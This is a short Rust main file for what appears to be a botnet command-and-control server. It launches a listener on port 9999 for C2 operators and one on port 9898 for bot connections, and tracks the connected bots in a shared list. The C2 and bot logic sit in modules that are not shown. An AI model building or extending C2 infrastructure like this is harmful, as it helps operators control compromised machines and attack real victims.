mod utils;
mod auth;
mod controller_c2;
mod controller_bots;

use utils::{terminal::reply, utils_menus::view_menu};
use auth::{auth_user, User};

use std::error::Error;
use std::net::IpAddr;
use std::sync::{Arc};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{Mutex, RwLock};



use controller_c2::controller::c2_services_users;
use controller_bots::controller::bots_conections;

pub struct Connection {
    // id: Uuid,
    pub ip: IpAddr,
    pub stream: Arc<RwLock<TcpStream>>,
}

pub type ConnectionList = Arc<RwLock<Vec<Connection>>>;


#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>>  {
// 
let connections: ConnectionList = Arc::new(RwLock::new(Vec::new()));

    let c2_service = c2_services_users("0.0.0.0", 9999, Arc::clone(&connections));
    let bot_service = bots_conections("0.0.0.0", 9898,  Arc::clone(&connections));

    // Aguarda ambas as funções terminarem
    tokio::try_join!(c2_service, bot_service)?;

    Ok(())
}
